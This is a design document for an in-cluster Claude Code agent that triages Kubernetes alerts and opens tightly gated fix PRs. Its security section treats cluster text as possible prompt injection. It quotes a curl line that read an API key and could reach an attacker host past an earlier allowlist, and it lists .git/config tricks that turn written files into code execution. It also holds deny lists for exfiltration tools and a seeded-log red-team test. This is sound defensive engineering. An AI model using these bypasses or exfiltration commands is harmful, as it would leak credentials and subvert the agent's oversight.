# Triage Agent Design

**Date:** 2026-10-11
**Status:** Implemented 2026-10-16; all classes in shadow
**Revised:** 2026-10-11 — detection split (PromQL first); Flux notification trigger dropped as redundant
**Goal:** When something in the cluster breaks, have a root-cause diagnosis waiting before anyone opens a terminal. For a short allowlist of well-understood failure classes, also open the fix PR without being asked. A human still merges.

---

## Background and why not an existing tool

The design is inspired by [k8s-mechanic](https://github.com/lenaxia/k8s-mechanic). That project is a controller that watches for failing workloads and has an in-cluster LLM agent open fix PRs. It was evaluated and rejected as-is:

- **This repo is public.** mechanic writes cluster evidence into PR bodies, and its secret redaction only matches patterns. Hostnames, topology and account details would be published.
- **It detects only loud failures.** It handles CrashLoopBackOff, OOMKilled, NotReady and similar, all of which Alertmanager already covers. The incidents that cost the most here were silent: empty Velero backups reporting `Completed`, Kyverno policies evaluating nothing, a healer CronJob exiting 137 behind a Ready status. It has no HelmRelease or Kustomization detection.
- **Its fixes are generic.** The `.claude/rules/` files exist because the obvious fix is often wrong here. Raising a limit to fix an unscoped list only defers the OOM, and patching webhook `failurePolicy` gets reverted. A generic prompt proposes exactly these.
- **It looks stalled.** The last release was v0.4.4 in March 2026, with only Renovate commits since.

What it gets right, and what this design keeps: deduplication by parent workload, a read-only agent, a human merging every change, and a dry-run mode.

The key differences in this design:

1. **The agent is Claude Code, run from a checkout of this repo.** `CLAUDE.md` and `.claude/rules/` load automatically, so the agent starts with everything already learned.
2. **The agent cannot publish.** A separate, deterministic publisher decides what reaches GitHub. No LLM-written free text ever reaches the public repo.
3. **Detection reuses existing alerting.** The agent is driven by Alertmanager, which already carries Flux, CronJob, Job and VolSync failures, plus a nightly sweep that covers only the silent failures no metric can express. It has no watcher of its own. See *Detection split*.

---

## Decisions

| Decision | Choice |
|---|---|
| Purpose | Hands-off fix PRs for allowlisted classes; a private diagnosis for everything else |
| Allowlisted classes | `oom-memory-limit`, `cpu-throttle-limit`, `renovate-breakage` — each starts in `shadow` mode |
| Report destination | Issues in a new **private** repo, `vollminlab/triage-reports`, plus a Pushover notification |
| Runtime | In-cluster: namespace `triage`, category `observability` |
| Claude auth | Dedicated Anthropic Console **API key** (see below) |
| Triggers | Alertmanager webhook and a nightly sweep. Anything expressible in PromQL is an alert rule, not a sweep check (see *Detection split*). |
| Architecture | dispatcher → suspended Job per incident → `investigate` (Claude Code) → `publish` (plain code) |

**Why an API key and not a subscription token:** Claude Code's legal and compliance page says OAuth subscription auth "is designed to support ordinary use of Claude Code", and that people building services "should use API key authentication." An unattended alert handler is at best a grey area under the subscription terms. An API key also gives a per-run `--max-budget-usd` cap and visible spend.

---

## Architecture

```
Alertmanager ──webhook──┐
                        ├──▶ dispatcher (Deployment) ──creates suspended Job──▶ triage Job
nightly CronJob ──tick──┘        │  dedup via GitHub issues                     ├─ investigate: claude -p  → result.json
                                 │  un-suspends 1 Job at a time                  └─ publish: issue / PR / Pushover
                                 └─ metrics, spend cap
```

### Components

| Unit | Location | Responsibility | Credentials |
|---|---|---|---|
| **dispatcher** | `build/triage-dispatcher/` (Python), deployed at `clusters/vollminlab-cluster/triage/dispatcher/app/` | Receives events, normalizes them to `Incident`, fingerprints, deduplicates, manages the Job queue, enforces the spend cap, exposes metrics | RBAC: create/list/patch/delete Jobs in `triage`; read-only get on pods, ReplicaSets, Jobs, Deployments, StatefulSets, DaemonSets and CronJobs cluster-wide, for owner resolution (the last four confirm a controller inferred from a deleted pod's name). GitHub App token with Issues **read/write** on the reports repo: it searches for open issues, and comments on and closes them when the alert resolves. Pushover token. |
| **investigate** container | `build/triage-agent/` image | Blobless-clones this repo at `main` into its private `/work` (public, so no auth needed), runs `claude -p` inside a wrapper, writes `/result/result.json` | Anthropic API key. ServiceAccount `triage-agent`: get/list/watch on all resources **except Secrets**, plus `pods/log`. **No GitHub write credential.** |
| **publish** container | same image, `publish.py`, no LLM | Reads `/result/result.json` (read-only, and nothing else investigate wrote); writes the private issue; clones the repo itself into its private `/publish` to validate the patch and, for live classes, open the PR; sends Pushover | Two GitHub App installation tokens, each scoped to one repo: `issues: write` (+ `metadata: read`) on the reports repo for every issue and comment, and `contents: write`, `pull_requests: write` (+ `metadata: read`) on the cluster repo for the push and the PR only (incidents only; a sweep never mints it); Pushover token |
| **sweep** | CronJob in `triage`, nightly | POSTs `{"source":"sweep"}` to the dispatcher | none |
| **policy config** | ConfigMap `triage-policy` (in git) | Class allowlist and `shadow\|live` mode per class, model, max turns, per-run and daily budget caps, sweep checklist, queue cap | none |

The investigate and publish containers share one Job and exactly one `emptyDir`, `result`, which holds `result.json` and is read-only in publish (see Security, "Containment"). Publish runs as the main container, and investigate runs first as an init container whose wrapper **always exits 0** (see Error handling). Nothing holding the API key or GitHub token outlives a single incident.

**Credential isolation inside the pod.** The two containers share the pod's ServiceAccount token. So the `triage-agent` ServiceAccount must stay read-only, and publish gets **no Kubernetes write access either**: it reports back only through its container termination message, which the dispatcher reads from pod status. The GitHub App Secret and Pushover Secret are volume-mounted into the publish container only. The Anthropic key is mounted into the investigate container only. Because investigate runs as an init container, it has finished before publish's credentials are mounted, and containers do not share a PID namespace.

### New external pieces

- Private GitHub repo `vollminlab/triage-reports`, created via tofu in `github-admin` per the branch-protection model, not the UI.
- GitHub App `vollminlab-triage`: Issues read/write on `triage-reports`; Contents and Pull requests write on `k8s-vollminlab-cluster`. Installed on those two repos only.
- 1Password items, all tagged Homelab: `Triage Anthropic API Key`, `Triage GitHub App` (`app_id`, `installation_id`, `private_key`) and `Triage Pushover` (`token`, `user`). Each is consumed by an ExternalSecret in `triage`.
- Alertmanager: a `triage` webhook receiver added as a `continue: true` route alongside the existing Pushover route. Pushover behaviour is unchanged.
- **No Flux notification-controller wiring.** Flux failures already reach Alertmanager through `FluxResourceNotReady` and `TerraformResourceNotReady` (`prometheusrule-gitops.yaml`, built on kube-state-metrics' `gotk_resource_info`). An earlier draft added a Flux `Provider` and `Alert` on the mistaken premise that Flux failures notify nowhere. It was dropped as a redundant second path.
- **Prerequisite: Kyverno metrics scraping** (see *Detection split*).

### Configuration defaults (caps calibrated 2026-10-15; see Implementation notes)

| Key | Value |
|---|---|
| `model` | `claude-opus-5-5` |
| `max_turns` | 40 |
| `per_run_budget_usd` | 2 (initially 3) |
| `daily_budget_usd` | 10 (initially 15) |
| `queue_cap` | 10 |
| `reinvestigate_after_hours` | 24 |
| `sweep_schedule` | `30 7 * * *` UTC (after the 03:00–06:00 backup window) |
| all classes | `shadow` |

---

## Data flow

### 1. Intake and normalization

Every source becomes an `Incident` with these fields: `source` (`alertmanager` / `sweep`), `reason` (alertname), `namespace`, `workload` (kind/name), `labels`, `started_at`, and the raw payload.

**Namespace comes from `exported_namespace` when present, and from `namespace` otherwise.** On every kube-state-metrics-derived alert (`FluxResourceNotReady`, `KubeJobFailed`, `CronJobNotSucceeding` and others), `namespace` is the scraper's own namespace, `monitoring`, and the object's real namespace is in `exported_namespace`. Reading the wrong label would fingerprint every Flux failure as a `monitoring` incident and would also break the self-loop guard. For Flux alerts, `workload` is `customresource_kind/name`.

For pod-keyed alerts, the dispatcher resolves the pod to its top-level owner (Pod → ReplicaSet → Deployment, Pod → Job → CronJob, and so on). Five restarting pods of one Deployment are therefore one incident, and pod churn faster than an alert's `for:` cannot fragment it (#1266).

### 2. Fingerprint

`sha256(source, namespace, workload)`, truncated to 12 hex characters for labels. Volatile values (pod hashes, messages, timestamps) are excluded, and so is the alertname whenever there is a workload: one broken workload fires several alerts at once, and they are one incident. An incident with no workload keeps the alertname: `sha256(source, reason, namespace, "")`. (Changed in 0.1.3; the original design always included `reason`, and the 2026-10-15 canary filed 10 issues for 2 workloads.)

### 3. Deduplication: GitHub issues are the state

There is no database and no CRD. Each issue body carries `<!-- fp:<full-hash> -->` and the label `fp/<12-hex>`.

- A Job labelled `triage.vollminlab.com/fp=<12-hex>` already exists (suspended or running) → drop the event.
- An open issue exists for the fingerprint, updated less than `reinvestigate_after_hours` ago → drop.
- An open issue exists and is older → dispatch. The result is posted as a **comment** on that issue.
- No open issue → dispatch a new incident.

### 4. Settle and queue

Alertmanager already applies `for:` and grouping, so events are queued immediately. `FluxResourceNotReady` has `for: 15m`, which already absorbs Flux's own retries.

Each Job is created with `spec.suspend: true`, so the queue *is* Kubernetes and survives a dispatcher restart. When no triage Job is running, the dispatcher un-suspends the oldest one. Just before un-suspending, it re-checks with the Alertmanager API that some active alert still maps to the incident's workload. If none does, it deletes the Job.

When `queue_cap` is reached, new events are dropped and a single Pushover message is sent until the queue drains.

### 5. Investigate

The wrapper:
1. Clones the repo.
2. Writes the incident to `/work/incident.json`.
3. Runs `claude -p` from the checkout root with `--output-format json`, `--json-schema` (the result schema), `--max-turns`, `--max-budget-usd`, `--permission-mode dontAsk`, and the baked-in settings (see Security).

The prompt is a short fixed instruction plus the incident. Cluster-derived text is wrapped in an explicit untrusted-data envelope.

`result.json` schema:

| Field | Type | Reaches public PR? |
|---|---|---|
| `status` | `ok` / `failed` | no |
| `failure_reason` | `max_turns` / `budget_cap` / `timeout` / `api_error` / `invalid_output` / null | no |
| `summary`, `root_cause` | string | **no** |
| `evidence[]` | strings | **no** |
| `confidence` | `low` / `medium` / `high` | no |
| `class` | allowlisted class name or `none` | yes (selects the template) |
| `patch` | unified diff or null | yes (as the diff itself) |
| `metrics` | map of name → number | yes (validated numeric) |
| `injection_suspected` | bool | no |
| `cost_usd` | number, from Claude's `total_cost_usd` | no |

### 6. Publish

**Always, and first, before any gate runs:** create the private issue (or a comment) with the full write-up, labels `fp/<hash>` and `class/<class>`, and status labels as applicable: `agent-error`, `redacted`, `injection-suspected`, `shadow`. The gate results (and the shadow preview, or the PR link) follow as a comment once the gates have run; an exception in any gate becomes a gate line there, never a lost issue.

**A PR is opened only if all four gates pass:**

1. `class` is allowlisted and in `live` mode.
2. `confidence` is `high`.
3. The **diff guard** passes:
   - Every changed file is under the incident workload's app directory (`clusters/vollminlab-cluster/<ns>/<app>/`).
   - No changed file matches `*-externalsecret.yaml`, `kustomization.yaml` or `*networkpolicy*`.
   - No files are added or deleted.
   - Changed lines are limited to the class's fields:
     - `oom-memory-limit`: `resources.limits.memory` (and the matching request), increase only, no more than 2× the current value, and the new value ≥ `metrics.peak_memory_bytes` × 1.2.
     - `cpu-throttle-limit`: removal of a `resources.limits.cpu` line only, and `metrics.throttled_ratio` is present.
     - `renovate-breakage`: a single `version:`, `tag:` or image-tag line, which must equal a value present in this repo's git history for that line (a revert or pin, never a new version). Renovate-pinned packages listed in `.claude/rules/` (for example `velero-plugin-for-aws`) are rejected outright.
4. Validation passes: `kustomize build` of the app's Flux Kustomization path, `kubeconform`, and `kyverno test` with the repo's CI policies.

**The PR body is generated by code**, never by the model. It is built from:
- A fixed per-class paragraph citing the rule file that justifies the change.
- A table parsed from the diff: file, field, old value, new value.
- The numeric `metrics` values.
- The fingerprint, as `fp/<12-hex>`, with no link to the private issue.

Branch: `fix/triage-<class>-<12-hex>-<run>`, where `<run>` is the Job's own suffix, so a re-investigation never collides with an earlier PR's branch. Title: `fix(<app>): <class template>`, for example `fix(renovate): raise memory limit to measured peak (triage)` for an OOM in the `renovate` app.

**In shadow mode**, gates 2–4 still run. The issue shows the exact branch, title, body and diff that *would* have been opened, plus which gates passed.

### 7. Notify

One Pushover message per new issue: the summary's first line (private channel, so this is fine), the issue link, and the PR link if one was opened. Comments on existing issues do not notify.

### 8. Resolution

When Alertmanager sends `resolved` and no other active alert maps to the same incident, the dispatcher:
- Comments "resolved at <time>" on the open issue for that fingerprint and closes it.
- Deletes any suspended Job for that fingerprint.

Open PRs are left alone.

### 9. Nightly sweep

The sweep incident's prompt comes from the `sweep_checklist` in `triage-policy`. The checklist holds **only the checks that need cross-object reasoning**. Everything a metric can express is an alert rule instead (see *Detection split*). Initial checklist:
- **Empty selector backups.** For each Velero backup in the last 24h whose schedule uses a `labelSelector`, count its PodVolumeBackups. Zero means it backed up nothing while reporting `Completed`. Velero exposes no usable metric for this: `velero_backup_items_total` reads 0 for every schedule.
- **Unprotected PVCs.** PVCs protected by neither Velero nor VolSync, using the per-pod mapping method in `velero.md`. Mapping per namespace collapses volume names and gives false results.
- **Inert Kyverno policies.** ClusterPolicies with zero `pass` results, read from PolicyReports. This check leaves the sweep once the PromQL rule below exists.

Each finding becomes its own incident with fingerprint `sha256("sweep", check, namespace, object)` and goes through deduplication normally. **Sweep findings never open PRs**, regardless of class. They always get diagnosis issues. At most **10 new issues** are filed per sweep run; findings past that are not filed, are named as a count on one extra line of the Pushover message, and are reported as `capped` in the termination summary. A later sweep files them if they persist.

---

## Detection split: PromQL first, the agent second

**Principle: the agent explains, alert rules detect.** Anything that can be expressed as a metric query becomes a PrometheusRule. It is deterministic and costs nothing per evaluation, and it reaches the agent through Alertmanager anyway. The sweep is reserved for checks that need joins across objects that no metric exposes. An LLM pass is the most expensive and least reliable way to evaluate a threshold.

Audit of the first draft's sweep checklist against the live rules (2026-10-11):

| Check | Disposition | Where |
|---|---|---|
| Flux object not Ready | **Already alerted** | `FluxResourceNotReady` (15m), `TerraformResourceNotReady` (30m) in `prometheusrule-gitops.yaml` |
| CronJob failing behind a Ready status | **Already alerted** | `CronJobNotSucceededRecently`, `WeeklyCronJobNotSucceededRecently` (`prometheusrule-gitops.yaml`); `CronJobNotSucceeding`, `KubeJobFailed` (`prometheusrule-custom.yaml`) |
| VolSync source stale | **Already alerted** | `VolSyncVolumeOutOfSync`, `VolSyncMissedIntervals`, `VolSyncNoMetrics` (`prometheusrule-volsync.yaml`) |
| Kyverno policy with zero `pass` results | **New rule, after a prerequisite** | see below; stays in the sweep until the rule is live |
| Selector backup with zero PodVolumeBackups | **Sweep** | no metric exists |
| PVC protected by neither Velero nor VolSync | **Sweep** | needs a per-pod join of PVBs, ReplicationSources and PVC labels |

**Prerequisite: scrape Kyverno.** The `kyverno-svc-metrics`, `kyverno-background-controller-metrics` and `kyverno-reports-controller-metrics` Services exist on port 8000, but nothing scrapes them: there is no ServiceMonitor, and `kyverno_policy_results_total` returns no series. Enable the chart's ServiceMonitors, verifying the keys by rendering the chart rather than trusting them, because `kyverno.md` records three silently ignored keys in this chart. Then add `KyvernoPolicyNoPassResults`: a ClusterPolicy with no `rule_result="pass"` increase over 24h. `kyverno` has no NetworkPolicies today, so no ingress rule is needed. If default-deny is added there later, it must admit Prometheus on 8000. This is a standalone PR that pays off even if the agent never ships, so it lands first.

**Rule for future checks:** a proposed sweep check must first answer "which metric would express this?" If one exists or can be scraped, write the alert rule instead. The sweep checklist is expected to shrink over time, never grow by default.

---

## Error handling

### Agent failures produce a visible issue, never silence

The wrapper exits 0 in every case and always writes `result.json`. It maps failures to `failure_reason`:

| Condition | Detected by | `failure_reason` |
|---|---|---|
| Turn limit hit | Claude JSON `subtype` / non-zero exit with max-turns error | `max_turns` |
| Budget cap hit | Claude JSON error | `budget_cap` |
| Wall clock | wrapper `timeout` (Job `activeDeadlineSeconds` − 120s) | `timeout` |
| 429, 5xx, credit exhausted | stderr / JSON error | `api_error` |
| Output fails schema | wrapper validation | `invalid_output` |

Publish turns any of these into an issue labelled `agent-error`, with the raw output attached. The Job has `backoffLimit: 0`, because a retry would pay for the whole investigation again.

### Publish failures

GitHub calls retry three times with exponential backoff inside the container. On final failure, Pushover receives the summary directly, marked "publish failed". A gate that blocks a PR is reported in the issue with the gate name and the rejected diff.

### Dispatcher

The dispatcher exposes Prometheus metrics (with a ServiceMonitor):
- `triage_events_total{source,outcome}` (dispatched / deduped / dropped_queue_full / dropped_resolved / ignored_self)
- `triage_jobs_total{status}`
- `triage_spend_usd_total`
- `triage_last_sweep_success_timestamp`

Spend is read from completed Jobs' `cost_usd`. Publish writes a one-line JSON summary (`cost_usd`, outcome, issue number) as its container termination message, and the dispatcher reads it from the pod status.

New PrometheusRules:
- `TriageDispatcherDown`: the dispatcher target is down for 10 minutes.
- `TriageSweepStale`: `time() - triage_last_sweep_success_timestamp > 26h`.
- `TriageAgentErrors`: 3 or more `agent-error` outcomes in 24h.

**Spend cap:** when the rolling 24h spend reaches `daily_budget_usd`, the dispatcher stops un-suspending Jobs (the queue holds) and sends one Pushover message.

**The daily cap is not a security boundary.** The spend it sums is each Job's `cost_usd`, which publish copies from `result.json`, and `result.json` is written inside the investigate container. That figure is trustworthy only for honest failures (a turn limit, a budget cap, an API error, a timeout charged at the per-run cap). A compromised investigation controls the file and can under-report its cost, down to zero, so the daily cap cannot bound what an attacker spends. The boundary is the **Anthropic workspace's monthly spend limit** (plan Task 6), which Anthropic enforces outside anything the agent can reach, together with the per-run `--max-budget-usd` the CLI enforces. Task 6 is therefore mandatory before Phase 5, not optional hardening.

**Self-loop guard:** events whose namespace is `triage` are ignored (counted as `ignored_self`). Those alerts still reach Pushover through the existing route.

---

## Security

Threat model: **any text the agent reads from the cluster may be an attacker's prompt injection.** Logs, events and annotations are reachable from workloads, including the DMZ.

1. **Nothing the model writes reaches the public repo verbatim.** The PR body is code-generated. The patch is constrained by the diff guard to the incident's own app directory and the class's fields.
2. **No write credentials in the agent.** The `triage-agent` ServiceAccount has get/list/watch on all resources except `secrets`, plus `pods/log`. The ClusterRole is written with explicit resource lists, not a wildcard minus Secrets, because RBAC has no deny. The GitHub token exists only in the publish container.
3. **Claude Code settings are baked into the image** as managed settings. Those have the highest precedence, and a deny rule cannot be overridden by an allow at any level, so a repo-level `.claude/settings.json` cannot loosen them. `claude -p` runs project hooks without a trust prompt, so the managed settings also disable hooks, and the static lockdown test asserts that the cloned repo contains no `.claude/settings.json`. If a repo-level settings file ever appears, the wrapper refuses to run and reports `invalid_output`.
   - Allow (the whole list, `build/triage/managed-settings.json`): Read, Grep and Glob within the checkout; the kubectl read verbs `Bash(kubectl get *)`, `Bash(kubectl describe *)`, `Bash(kubectl logs *)`, `Bash(kubectl top *)` and `Bash(kubectl events *)`; `Bash(flux get *)`; and `Bash(triage-query vm *)`, `Bash(triage-query vm-lt *)` and `Bash(triage-query loki *)`. There is no `helm` (Helm releases are Secrets; `kubectl get helmrelease -o yaml` carries the history), no `git` and no `curl`.
   - **`triage-query` replaces curl.** The old allows, `Bash(curl -s http://loki.monitoring.svc:3100/*)` and the like, also matched a second URL on the same command line: `curl -s http://loki…/x file:///var/run/secrets/triage/anthropic/api_key` read the Anthropic key past the Read deny, and `… https://attacker/…` reached any host. Combined short flags (`-sOx`) slipped past the per-flag write denies. `triage-query vm|vm-lt|loki <path?query>` (`build/triage/triage/query.py`, installed as a console script) maps the target name to a fixed base URL (`http://victoria-metrics-single-server.monitoring.svc:8428`, `http://victoria-metrics-lt-server.monitoring.svc:8428`, `http://loki.monitoring.svc:3100`), takes exactly two arguments, requires the path to start with `/api/v1/` or `/loki/api/v1/` and its endpoint part to be a plain path (no percent-encoding, no `admin` segment), and refuses `..`, `@`, `\`, whitespace, control characters, `://` and `#`. It sends one GET with a 30 s timeout, follows no redirect, ignores proxy variables, prints at most 1 MiB and writes no file. Nothing is read from the environment; tests point it at a local server through a module attribute only.
   - Deny: WebFetch, WebSearch, Edit, Write, NotebookEdit; `Bash(helm *)`; `Bash(git *)`, because `git log --output=<path> --pretty=format:...` writes arbitrary bytes to any path; `Bash(curl *)` and `Bash(wget *)` outright; the Secret reads (`kubectl get secret*`, `kubectl describe secret*`, and `kubectl * secret*`, which also catches `kubectl get -n x secrets`), `kubectl exec`, `port-forward`, `cp`, `proxy` and `debug`; every kubectl and flux flag that aims the client elsewhere or swaps its credentials (`--raw`, `--kubeconfig`, `--token`, `--server`/`-s`, `--as`, `--user`, `--context`, `--cluster`, `--certificate-authority`, `--client-certificate`, `--client-key`, `--insecure-skip-tls-verify`, `--tls-server-name`) or reads or writes a local file (`-f`/`--filename`, `-k`/`--kustomize`, `--cache-dir`, `--profile*`, and the file-reading output formats `jsonpath-file`, `go-template-file`, `templatefile` and `custom-columns-file`, which would print a mounted secret as a "template"); and Read of `/var/run/secrets/**`, `/proc/**` and `/etc/triage/**`.
   - These denies are defence in depth, not the boundary. Pattern rules cannot anticipate every spelling a permitted tool accepts (mixed-case resource names such as `kubectl get Secrets`, say). For Secrets the boundary is RBAC: the `triage-agent` ClusterRole grants no `secrets` at all. The case variants (`kubectl get Secrets`, which the real matcher allowed) and the comma form (`pods,secrets`) are denied too, but only as defence in depth: RBAC, not the deny patterns, remains the real boundary. The patterns are space- or comma-anchored (`kubectl * Secret*`), because an unanchored `*ecret*` would also deny `externalsecrets`. For everything investigate can write, it is the containment below.
4. **NetworkPolicy in `triage`:**
   - `default-deny-all` and `allow-dns`.
   - The dispatcher accepts ingress on its container port from `monitoring` (Alertmanager, Prometheus scrape) and the sweep CronJob.
   - Egress for the agent and publish pods:
     - the apiserver on 6443
     - `monitoring` on 8428 (VictoriaMetrics) and 3100 (Loki), both container ports verified 2026-10-11. Still required: `triage-query` is a client in the investigate container, not a proxy, so the traffic is the same as curl's was
     - 443 to `0.0.0.0/0` except RFC1918, for Anthropic, GitHub clone and API, and Pushover
   - Egress for the dispatcher: the apiserver, `monitoring` on 9093 (Alertmanager `http-web` container port, verified 2026-10-11) and 443 (GitHub, Pushover).
   - Container ports are verified per `networkpolicy.md` before writing, and rows are added to its port table.
5. **`monitoring` is default-deny on ingress.** It needs a new `allow-triage` policy, scoped per the `networkpolicy.md` checklist to the target pods and ports, never `podSelector: {}`:
   - `app: server` (VictoriaMetrics, both tiers) on 8428 and `app: loki` on 3100, from `triage` pods labelled `app: triage-agent`.
   - `app: alertmanager` on 9093, from `app: triage-dispatcher`.
6. **Accepted residual risk:** NetworkPolicy cannot filter by FQDN, so internet egress on 443 is open. An injected agent could in principle send data it can read to an outside host. It cannot read Secrets, and its Bash allowlist has no general HTTP client: curl and wget are denied, and `triage-query` reaches only three fixed in-cluster hosts. An egress proxy is deliberately out of scope.
7. **Leak scan.** Publish runs `gitleaks` over the issue body, comments, the patch and the PR body before posting. On a hit, it redacts the match and labels the issue `redacted`. A hit in the PR body or patch blocks the PR.
8. **Existing gates still apply to every PR:** CI (Kyverno test, gitleaks secret scanning), branch protection, and a human merge.

**Containment: publish trusts only `result.json`.** The investigate container runs a model that any cluster text may have prompt-injected, and the publish container holds the GitHub App key, with write access to a public repo whose same-repo branches run CI with secrets. They used to share an `emptyDir` holding the git checkout, `HOME` and `result.json`. They run as the same uid, so file permissions cannot separate them; what separates them is that a volume one container never mounts is unreachable from it, and investigate has exited before publish starts. Verified 2026-10-11, the agent's then-allowed `git log --output=<path> --pretty=format:...` wrote an arbitrary `.git/config` into that checkout, and anything investigate can write there can become code or commits in publish: a `filter.<x>.clean`, `core.fsmonitor` or `core.sshCommand` in `.git/config` runs on publish's `git add` or `git status`; `url.insteadOf`, `http.proxy` or a credential helper redirects or captures the push and its token; a planted commit or ref becomes the diff guard's baseline and rides into the PR; a `.pth` file under `HOME` runs at Python startup. Filtering those inputs is a losing game, so the boundary is the filesystem:

- **One shared volume.** The Job has separate `emptyDir`s for investigate's work (`/work`: checkout, `HOME`, scratch), publish's work (`/publish`: its own clone and `HOME`) and each container's `/tmp`. The only volume both mount is `result`, writable in investigate and read-only in publish. `jobs.check_template` refuses to start the dispatcher if the template drifts from this, comparing volumes by what backs them, so two names over one claim count as shared. It also allows only `emptyDir`, `configMap` and `secret` volumes (no `hostPath`, PVC, `csi`, `ephemeral`, `projected`, `downwardAPI`, `nfs` or anything else), no `subPath`/`subPathExpr` mount, no `envFrom` and no `valueFrom` other than `secretKeyRef`, and no `shareProcessNamespace`, `hostPID`, `hostIPC`, `hostNetwork` or privileged container: a shared process namespace would let investigate read publish's environment and open files through `/proc`.
- **Only this run's result.json survives.** investigate empties `/result` (files, directories and symlinks, never following a link) before claude starts, and fails the run as `setup_failed` if it cannot. Before the final write it empties it again, writes under a random `O_CREAT|O_EXCL|O_NOFOLLOW` temp name (retrying on collision) and renames that over `result.json`, so nothing the model planted during the run, at `result.json` or at a guessable temp name, is read in its place.
- **result.json is data.** publish opens it without following a symlink, requires a regular file under 1 MiB, and rebuilds the record from validated parts (the schema-checked agent fields, or a known failure reason with a string detail), so a failure record cannot carry a patch and a cost cannot be NaN, infinite or negative.
- **publish clones for itself.** A fresh, blobless clone of `main` from `https://github.com/<cluster_repo>.git` into `/publish/repo`, refusing a directory that already exists. The guard, validation, commit and push all happen there. Before the push, `HEAD~1` must equal the clone's `origin/main` and the branch must be exactly one commit ahead.
- **A minimal environment for every subprocess.** git, kustomize, kubeconform, kyverno and gitleaks get `PATH`, `HOME=/publish/home`, `LANG` and git's `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null` and `GIT_TERMINAL_PROMPT=0`, nothing inherited, with the token added to the push alone. Every git call also sets `core.hooksPath=/dev/null`, `core.fsmonitor=false`, `core.autocrlf=false`, `protocol.file.allow=never` and `protocol.ext.allow=never`. Every timeout is cut to a publish budget (240 s, leaving time for the GitHub calls within investigate's 300 s reserve).
- **Isolated Python.** The package is installed into the image's site-packages and every entrypoint runs as `python -I -m triage.<module>`, so no working directory, `PYTHONPATH` or user site-packages is ever on `sys.path`.
- **The issue first.** publish files the private issue with the diagnosis before any gate runs, then runs the gates inside a handler that turns any exception into a gate line, and posts the gate report as a comment. Nothing the gates do can lose the diagnosis.

The in-clone protections from before (the diff guard reads the committed `HEAD`, a dirty tree never becomes a PR, and the commit is compared with what the gates approved by numstat and byte for byte) still run inside publish's own clone, as defence in depth.

---

## Testing

### Unit tests (pytest), wired into CI from day one

`build-triage-dispatcher.yaml` and `build-triage-agent.yaml` run the test suite before pushing to Harbor, and a test failure blocks the push.

- **Dispatcher:**
  - Normalization from captured real Alertmanager payloads (fixtures), including a `FluxResourceNotReady` payload. The test asserts that `exported_namespace` wins over `namespace`, so the incident lands in the object's namespace, not `monitoring`.
  - Fingerprint stability across pod hashes.
  - Deduplication decisions against a fake GitHub client.
  - Suspended-queue ordering and the cap.
  - Settle delay.
  - Resolve closes the issue and deletes the queued Job.
  - Own-namespace ignore.
  - Spend-cap halt.
- **Publish** (security-critical, adversarial fixtures):
  - The diff guard rejects a patch that touches another app's directory, touches a `*-externalsecret.yaml`, adds a file, changes an image under the OOM class, lowers a memory limit, raises it more than 2×, raises it without `metrics.peak_memory_bytes`, or pins `velero-plugin-for-aws`.
  - **Provenance canary:** a unique marker string placed in every free-text field of `result.json` must never appear in the generated PR body or branch name.
  - gitleaks redaction on a planted fake key, and blocking when the key is in the patch.
  - Each gate failure renders its explanation in the issue.
  - Shadow mode renders the would-be PR and never calls the PR API.
- **Wrapper** (stub `claude` binary): success, invalid JSON, max-turns, budget cap, timeout and 429 each produce the matching `result.json`, and the wrapper exits 0 in every case.
- **Lockdown, static check:** the managed settings contain every required deny entry, and the image contains no project hooks.

### Live verification after first deploy (all classes in `shadow`)

1. **Alertmanager path:** `amtool alert add TriageTest` with a namespace and workload label routes through the real config. Check that a Job ran, a private issue was created, a second `amtool` fire was deduplicated, and expiring the alert closed the issue.
2. **Real OOM:** a `triage-canary` Deployment (standard labels, approved-registry image, tiny memory limit) OOMs on purpose. The shadow PR must raise the limit based on measured peak usage and pass every gate.
3. **Flux path and false alarms:** fire a synthetic `FluxResourceNotReady` with `amtool`, naming a real HelmRelease that is actually healthy. Expected: the incident's namespace is the HelmRelease's (not `monitoring`), and the diagnosis reports the object as Ready and the alert as spurious, with `confidence` below `high` and no shadow PR. This proves the agent checks its premise instead of trusting the alert.
4. **Injection red-team:** the canary logs instructions telling the agent to curl an outside host, print Secrets, and open a PR changing another app. Expected: denied tool calls in the Claude JSON log, `injection-suspected` on the issue, no PR, and no outside connection in the canary's or agent's flow logs.
5. **Sweep:** the first nightly run sets `triage_last_sweep_success_timestamp`, and `TriageSweepStale` stays quiet.
6. **Cost:** read `cost_usd` from the runs above, set `per_run_budget_usd` and `daily_budget_usd` from measured values, and record them in this spec.

Delete the canary once these pass. **A Ready Deployment and a Completed Job are not evidence.** Each step is verified by the artifact it produces: the issue, the label, the metric, or the absent PR.

### Shadow mode as the acceptance test

Each shadow issue is labelled `shadow-correct` or `shadow-wrong` by a human. A class is flipped to `live` in `triage-policy`, by a PR, only after **3 consecutive `shadow-correct` with no `shadow-wrong` in between** for that class. Promotion is always a manual git change.

---

## Out of scope

- Any write to the cluster other than Jobs in `triage`. All changes go through git.
- Auto-merge.
- Auto-closing triage PRs.
- An egress proxy or FQDN filtering.
- Investigating `triage`'s own failures.
- Additional fix classes. These are added later by editing `triage-policy` and the diff guard, each starting in `shadow`.

---

## Docs to update when implemented

- `docs/cluster-reference.md`: the `triage` namespace, dispatcher, agent image and sweep CronJob (CI enforces this).
- `.claude/rules/networkpolicy.md`: port table rows for `triage` and the `monitoring` `allow-triage` rule.
- `.claude/rules/kyverno.md`: no change. `observability` is an existing category.

---

## Implementation notes

Recorded when the plan (`docs/superpowers/plans/triage-agent.md`) finished on 2026-10-16. Where these
differ from the sections above, these win.

### Deviations from this spec

1. **One image** (`build/triage/`), with a different `command` per role, not two images. CI builds each `build/*/` directory in isolation, so shared code can live in only one.
2. **No `helm`.** `helm history` needs `get secrets`, which the agent must never have. Flux status and the HelmRelease's `status.history` replace it.
3. The dispatcher **mints an Issues-only token for `triage-reports`**, because it has to comment on and close issues when an alert resolves.
4. **24h gauges recomputed from finished Jobs** (`triage_jobs_24h`, `triage_spend_usd_24h`), not counters. A counter resets on restart and would wipe the daily cap. `TriagePublishFailing` was added.
5. A **`setup_failed`** failure reason, for a failed clone or a missing CLI.
6. The Alertmanager webhook route is **a 1Password edit** (item "Alertmanager Config"), because the whole `alertmanager.yaml` lives there.
7. **`git clone --filter=blob:none`**, not a shallow clone, because the `renovate-breakage` guard needs file history.
8. Kyverno's top-level `serviceMonitor.enabled` is **silently ignored** by chart 3.9.0. The per-controller keys work.
